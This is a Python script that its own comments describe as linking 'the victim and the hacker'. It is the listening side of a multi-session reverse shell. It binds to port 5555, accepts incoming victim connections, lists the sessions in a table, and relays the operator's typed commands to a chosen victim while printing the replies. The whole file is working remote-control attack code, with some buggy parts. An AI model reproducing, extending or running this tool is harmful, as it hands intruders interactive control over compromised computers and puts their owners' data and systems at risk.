#this code make a connection between the victim and the hacker
#this just the first  version
'''setting colors'''
g = "\033[32m"
c = "\033[36m"
v = "\033[35m"
y = "\033[33m"
r = "\033[31m"
none = "\033[0m"
'''importing the modules'''
import socket
import threading
import queue
import sys , os , time
from tabulate import *
import tqdm
from server_host.tool import *
from S_T import *
#from tool import help_menu
'''setting the variabeles'''
NUMBER_OF_THREAD = 2
JOB_NUMBER = [1 , 2]
queue = queue.Queue()
all_connection = []
address_connection = []
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = socket.gethostbyname(socket.gethostname())
port = 5555
SEPARATOR = "<SEPARATOR>"
''' setting a socket creating'''
def connection_info():
	try:
		global host
		global port 
		global s
	except s.error as error:
		print(f"\n  {c}[{y}!{c}] {y}there was an error in creating a socket {v}>> {r}{error}{none}")
'''binding the conection'''
def connection_bind():
	try:
		global host 
		global port
		global s
		print(f"\n  {c}[{g}+{c}] {v}binding connection to the port {r}>> {y}{port}")
		s.bind((host , port))
		print(f"\n  {c}[{g}!{c}] {g}binding was completed")
		s.listen(5)
	except socket.error as error:
		print(f"  {c}[{r}-{c}] {y}Binding error {v}>> {r}{error}")
		time.sleep(1)
		print(f"  {c}[{r}!{c}] {y}Retrying ...")
		return connection_bind()
'''accepting the connections'''
def conection_accept():
	for i in all_connection:
		i.close()
	del all_connection[:]
	del address_connection[:]
	while 1:
		try:
			conn , address = s.accept()
			conn.setblocking(1)
			all_connection.append(conn)
			address_connection.append(address)
			print(f"\n  {c}[{g}+{c}] {g}Connection have ben accepted {y}IP{r} :{v} {address_connection[0]} {y}PORT{r} :{v} {str(address_connection[1])}")
			continue
		except:
			print(f"\n  {c}[{r}-{c}] {y}Faild to accept the connection")
'''creating a shell intarface'''
def intarface():
	while True:
		op_listen = input(f"\n {c}${y}S{r}-{y}T{r}session{v}>> {g}")
		if op_listen == "clear":
			os.system("clear")
		elif op_listen == "exit":
			s.close()
			sys.exit()
		elif "connect" in op_listen:
			conns = session_connect(op_listen)
			if conns is not None:
				send_command(conns)
		elif op_listen == "show session":
			session_list()
		elif op_listen == "help":
			help_menu_session()
		else:
			print(f"  {c}[{r}!{c}] {y}command not find {r}:{v} {op_listen}")
'''creating a list os every session'''
def session_list():
	result = ""
	for i , conn in enumerate(address_connection):
		try:
			s.send(str.encode("utf-8"))
			s.recv(1024)
		except socket.error as error:
			del all_connection[i]
			del address_connection[i]
		result = f"{y}session number" + f"{y}IP",f"{y}PORT"
		info = f"{r}{str(i)}" + f"{r}{address_connection[i][0]}" + f"{r}{address_connection[i][1]}"
	print(tabulate(result, info,tablefmt="fancy_grid"))

'''connecting to the targets'''
def session_connect(op_listen):
	try:
		print(f"  {c}[{g}!{c}] {y}Trying to connecting to {v}>> {r} {str(address_connection[0])}")
		time.sleep(1)
		target = op_listen.replace("connect ","")
		target = int(target)
		conn = all_connection[target]
		time.sleep(2)
		print(f"  {c}[{g}+{c}] {g} you are now connected to {v}>>{r} {address_connection[0]}",end="")
		print(str(address_connection[0])+ f"{c}${r}> {g}")
		return conn
	except:
		print(f"  {c}[{r}-{c}] {y}Could not to connect to  {v}>> {r}{address_connection[0]}")
		return None
'''sending commands to the victim'''
def send_command(conn):
	while True:
		try:
			msg_comand = input(f" {c}$ {y}{str(address_connection[0])}{r}> {g}")
			if len(str.encode(msg_comand)) > 0:
				conn.send(str.encode(msg_comand))
				target_response = str(conn.recv(20480), "utf-8")
				print(target_response ,end="")
			if msg_comand == "#exit":
				break
		except:
			print(f" {c}[{r}-{c}] {y}the target is not connected{none}")
			break

'''creat some thread'''
def workers():
	for _ in range(NUMBER_OF_THREAD):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()
'''creat queue work'''
def work():
	while True:
		x = queue.get()
		if x == 1:
			connection_info()
			connection_bind()
			conection_accept()
		elif x == 2:
			intarface()
		queue.task_done()
'''jobs for threads'''
def jobs():
	for x in JOB_NUMBER	:
		queue.put(x)
	queue.join()
'''executing all this function'''
def reverse_shell_exec():
	workers()
	jobs()
